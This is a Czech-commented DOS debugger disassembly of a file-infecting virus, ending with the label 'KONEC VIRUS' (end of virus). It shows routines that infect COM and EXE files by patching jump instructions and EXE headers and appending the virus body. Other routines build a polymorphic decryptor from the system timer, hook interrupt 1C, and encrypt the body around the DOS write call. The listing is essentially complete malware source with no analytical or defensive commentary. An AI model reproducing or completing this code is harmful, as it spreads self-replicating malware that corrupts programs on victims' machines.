4CDE:060D 0BD2           OR     DX,DX
4CDE:060F 7556           JNZ    0667
4CDE:0611 3D46F6         CMP    AX,F646       ; Prilis dlouhy soubor.
4CDE:0614 7351           JNB    0667
4CDE:0616 8BF0           MOV    SI,AX
4CDE:0618 C606BE0000     MOV    Byte Ptr [00BE],00
4CDE:061D C706C2000001   MOV    Word Ptr [00C2],0100
4CDE:0623 C706C4000000   MOV    Word Ptr [00C4],0000
4CDE:0629 C706C6000000   MOV    Word Ptr [00C6],0000
4CDE:062F A16908         MOV    AX,[0869]
4CDE:0632 A3BF00         MOV    [00BF],AX
4CDE:0635 A06B08         MOV    AL,[086B]
4CDE:0638 A2C100         MOV    [00C1],AL
4CDE:063B FF066708       INC    Word Ptr [0867]
4CDE:063F 56             PUSH   SI
4CDE:0640 8BDE           MOV    BX,SI
4CDE:0642 81C30001       ADD    BX,0100
4CDE:0646 E8E300         CALL   072C
4CDE:0649 5E             POP    SI
4CDE:064A 721B           JB     0667
4CDE:064C E8BFFE         CALL   050E         ; SEEK na zacatek.
4CDE:064F 7216           JB     0667
4CDE:0651 C6066908E9     MOV    Byte Ptr [0869],E9
4CDE:0656 81C61E08       ADD    SI,081E
4CDE:065A 89366A08       MOV    [086A],SI
4CDE:065E BA6908         MOV    DX,0869      ;============================
4CDE:0661 B90300         MOV    CX,0003      ; Zapis 3 byte.
4CDE:0664 E890FE         CALL   04F7         ;
4CDE:0667 C3             RET
;=========================================================================
; NAKAZENI SOUBORU TYPU .EXE
;
4CDE:0668 E89AFE         CALL   0505      ; SEEK na konec souboru.
4CDE:066B 72FA           JB     0667
4CDE:066D 8BF0           MOV    SI,AX
4CDE:066F 8BFA           MOV    DI,DX
4CDE:0671 8BD8           MOV    BX,AX
4CDE:0673 8BCA           MOV    CX,DX
4CDE:0675 A16D08         MOV    AX,[086D]
4CDE:0678 F726E500       MUL    Word Ptr [00E5]
4CDE:067C 2BC3           SUB    AX,BX
4CDE:067E 1BD1           SBB    DX,CX
4CDE:0680 72E5           JB     0667
4CDE:0682 A17708         MOV    AX,[0877]
4CDE:0685 F726E300       MUL    Word Ptr [00E3]
4CDE:0689 03067908       ADD    AX,[0879]
4CDE:068D 8BCA           MOV    CX,DX
4CDE:068F 8BD8           MOV    BX,AX
4CDE:0691 A17108         MOV    AX,[0871]
4CDE:0694 F726E300       MUL    Word Ptr [00E3]
4CDE:0698 2BF0           SUB    SI,AX
4CDE:069A 1BFA           SBB    DI,DX
4CDE:069C A17708         MOV    AX,[0877]
4CDE:069F 051000         ADD    AX,0010
4CDE:06A2 A3C600         MOV    [00C6],AX
4CDE:06A5 8BC3           MOV    AX,BX
4CDE:06A7 8BD1           MOV    DX,CX
4CDE:06A9 2BDE           SUB    BX,SI
4CDE:06AB 1BCF           SBB    CX,DI
4CDE:06AD 7216           JB     06C5
4CDE:06AF 56             PUSH   SI
4CDE:06B0 57             PUSH   DI
4CDE:06B1 83C650         ADD    SI,+50
4CDE:06B4 83D700         ADC    DI,+00
4CDE:06B7 2BC6           SUB    AX,SI
4CDE:06B9 1BD7           SBB    DX,DI
4CDE:06BB 5F             POP    DI
4CDE:06BC 5E             POP    SI
4CDE:06BD 726C           JB     072B
4CDE:06BF 810677088700   ADD    Word Ptr [0877],0087
4CDE:06C5 C606BE0001     MOV    Byte Ptr [00BE],01
4CDE:06CA A17F08         MOV    AX,[087F]
4CDE:06CD 051000         ADD    AX,0010
4CDE:06D0 A3C400         MOV    [00C4],AX
4CDE:06D3 A17D08         MOV    AX,[087D]
4CDE:06D6 A3C200         MOV    [00C2],AX
4CDE:06D9 FF066708       INC    Word Ptr [0867]
4CDE:06DD E825FE         CALL   0505                  ; SEEK na konec.
4CDE:06E0 7249           JB     072B
4CDE:06E2 8BD8           MOV    BX,AX
4CDE:06E4 8BCA           MOV    CX,DX
4CDE:06E6 81C36908       ADD    BX,0869
4CDE:06EA 83D100         ADC    CX,+00
4CDE:06ED 8BD7           MOV    DX,DI
4CDE:06EF 8BC6           MOV    AX,SI
4CDE:06F1 F736E300       DIV    Word Ptr [00E3]
4CDE:06F5 A37F08         MOV    [087F],AX
4CDE:06F8 53             PUSH   BX
4CDE:06F9 51             PUSH   CX
4CDE:06FA 52             PUSH   DX
4CDE:06FB 8BDA           MOV    BX,DX
4CDE:06FD E82C00         CALL   072C
4CDE:0700 5A             POP    DX
4CDE:0701 59             POP    CX
4CDE:0702 5B             POP    BX
4CDE:0703 7226           JB     072B
4CDE:0705 81C22108       ADD    DX,0821
4CDE:0709 89167D08       MOV    [087D],DX
4CDE:070D 8BC3           MOV    AX,BX
4CDE:070F 8BD1           MOV    DX,CX
4CDE:0711 F736E500       DIV    Word Ptr [00E5]
4CDE:0715 40             INC    AX
4CDE:0716 A36D08         MOV    [086D],AX
4CDE:0719 89166B08       MOV    [086B],DX
4CDE:071D E8EEFD         CALL   050E
4CDE:0720 7209           JB     072B
4CDE:0722 B91C00         MOV    CX,001C
4CDE:0725 BA6908         MOV    DX,0869
4CDE:0728 E8CCFD         CALL   04F7
4CDE:072B C3             RET
;=========================================================================
;
4CDE:072C 32E4           XOR    AH,AH
4CDE:072E CD1A           INT    1A
4CDE:0730 8BC2           MOV    AX,DX
4CDE:0732 03C1           ADD    AX,CX
4CDE:0734 1E             PUSH   DS
4CDE:0735 07             POP    ES
4CDE:0736 BF2108         MOV    DI,0821
4CDE:0739 8BF7           MOV    SI,DI
4CDE:073B B92000         MOV    CX,0020
4CDE:073E FC             CLD
4CDE:073F F3             REPZ
4CDE:0740 AB             STOSW
4CDE:0741 FA             CLI
4CDE:0742 C6040E         MOV    Byte Ptr [SI],0E
4CDE:0745 46             INC    SI
4CDE:0746 C604BB         MOV    Byte Ptr [SI],BB
4CDE:0749 46             INC    SI
4CDE:074A 2B1EE700       SUB    BX,[00E7]
4CDE:074E 891C           MOV    [SI],BX
4CDE:0750 46             INC    SI
4CDE:0751 46             INC    SI
4CDE:0752 C6041F         MOV    Byte Ptr [SI],1F
4CDE:0755 46             INC    SI
4CDE:0756 C604B9         MOV    Byte Ptr [SI],B9
4CDE:0759 46             INC    SI
4CDE:075A B82108         MOV    AX,0821
4CDE:075D 2BC2           SUB    AX,DX
4CDE:075F 8904           MOV    [SI],AX
4CDE:0761 46             INC    SI
4CDE:0762 46             INC    SI
4CDE:0763 B0B2           MOV    AL,B2
4CDE:0765 8A26E700       MOV    AH,[00E7]
4CDE:0769 32E6           XOR    AH,DH
4CDE:076B 8904           MOV    [SI],AX
4CDE:076D 46             INC    SI
4CDE:076E 46             INC    SI
4CDE:076F C70481C1       MOV    Word Ptr [SI],C181
4CDE:0773 46             INC    SI
4CDE:0774 46             INC    SI
4CDE:0775 8914           MOV    [SI],DX
4CDE:0777 46             INC    SI
4CDE:0778 46             INC    SI
4CDE:0779 83E20F         AND    DX,+0F
4CDE:077C C604EB         MOV    Byte Ptr [SI],EB
4CDE:077F 46             INC    SI
4CDE:0780 8814           MOV    [SI],DL
4CDE:0782 46             INC    SI
4CDE:0783 03F2           ADD    SI,DX
4CDE:0785 8BDE           MOV    BX,SI
4CDE:0787 C7040097       MOV    Word Ptr [SI],9700
4CDE:078B 46             INC    SI
4CDE:078C 46             INC    SI
4CDE:078D A1E700         MOV    AX,[00E7]
4CDE:0790 8904           MOV    [SI],AX
4CDE:0792 46             INC    SI
4CDE:0793 46             INC    SI
4CDE:0794 C60443         MOV    Byte Ptr [SI],43
4CDE:0797 46             INC    SI
4CDE:0798 C604EB         MOV    Byte Ptr [SI],EB
4CDE:079B 46             INC    SI
4CDE:079C 8B166708       MOV    DX,[0867]
4CDE:07A0 83E20F         AND    DX,+0F
4CDE:07A3 8814           MOV    [SI],DL
4CDE:07A5 46             INC    SI
4CDE:07A6 03F2           ADD    SI,DX
4CDE:07A8 C604E2         MOV    Byte Ptr [SI],E2
4CDE:07AB 2BDE           SUB    BX,SI
4CDE:07AD 83EB02         SUB    BX,+02
4CDE:07B0 46             INC    SI
4CDE:07B1 881C           MOV    [SI],BL
4CDE:07B3 46             INC    SI
4CDE:07B4 C604E9         MOV    Byte Ptr [SI],E9
4CDE:07B7 BF1001         MOV    DI,0110
4CDE:07BA 2BFE           SUB    DI,SI
4CDE:07BC 83EF03         SUB    DI,+03
4CDE:07BF 46             INC    SI
4CDE:07C0 893C           MOV    [SI],DI
4CDE:07C2 FB             STI
4CDE:07C3 BEEA07         MOV    SI,07EA
4CDE:07C6 BF8508         MOV    DI,0885
4CDE:07C9 57             PUSH   DI
4CDE:07CA B93700         MOV    CX,0037
4CDE:07CD FC             CLD
4CDE:07CE F3             REPZ
4CDE:07CF A4             MOVSB
4CDE:07D0 B81C35         MOV    AX,351C
4CDE:07D3 E844FD         CALL   051A
4CDE:07D6 891ED700       MOV    [00D7],BX
4CDE:07DA 8C06D900       MOV    [00D9],ES
4CDE:07DE B81C25         MOV    AX,251C
4CDE:07E1 BABB08         MOV    DX,08BB
4CDE:07E4 E833FD         CALL   051A
4CDE:07E7 58             POP    AX
4CDE:07E8 FFD0           CALL   AX
4CDE:07EA 9C             PUSHF
4CDE:07EB 1E             PUSH   DS
4CDE:07EC B81C25         MOV    AX,251C
4CDE:07EF C516D700       LDS    DX,[00D7]
4CDE:07F3 E824FD         CALL   051A
4CDE:07F6 1F             POP    DS
4CDE:07F7 9D             POPF
4CDE:07F8 C3             RET
4CDE:07F9 BE0000         MOV    SI,0000
4CDE:07FC B92108         MOV    CX,0821
4CDE:07FF 8A162A08       MOV    DL,[082A]
4CDE:0803 2814           SUB    [SI],DL
4CDE:0805 46             INC    SI
4CDE:0806 E2FB           LOOP   0803
4CDE:0808 B440           MOV    AH,40
4CDE:080A 8B1E6108       MOV    BX,[0861]
4CDE:080E BA0000         MOV    DX,0000
4CDE:0811 B96908         MOV    CX,0869
4CDE:0814 9C             PUSHF
4CDE:0815 FF1E6308       CALL   FAR [0863]
4CDE:0819 7202           JB     081D
4CDE:081B 2BC1           SUB    AX,CX
4CDE:081D 9C             PUSHF
4CDE:081E BE0000         MOV    SI,0000
4CDE:0821 B92108         MOV    CX,0821
4CDE:0824 8A162A08       MOV    DL,[082A]
4CDE:0828 0014           ADD    [SI],DL
4CDE:082A 46             INC    SI
4CDE:082B E2FB           LOOP   0828
4CDE:082D 9D             POPF
4CDE:082E C3             RET

4CDE:082F CF             IRET

;=========================================================================
; START PROGRAMU.

AX=0000  BX=0000  CX=4908  DX=0000  SP=0200  BP=0000  SI=0000  DI=0000
DS=48C5  ES=48C5  SS=48D5  CS=4CDE  IP=0830   NV UP EI PL NZ NA PO NC
4CDE:0830 0E             PUSH   CS
4CDE:0831 BB8CC1         MOV    BX,C18C
4CDE:0834 1F             POP    DS
4CDE:0835 B99473         MOV    CX,7394
4CDE:0838 B217           MOV    DL,17
4CDE:083A 81C18D94       ADD    CX,948D
4CDE:083E EB0D           JMP    084D

4CDE:084D 0097833E       ADD    [BX+3E83],DL
4CDE:0851 43             INC    BX
4CDE:0852 EB06           JMP    085A

4CDE:085A E2F1           LOOP   084D
4CDE:085C E9C0F8         JMP    011F



     0878 KONEC VIRUS
     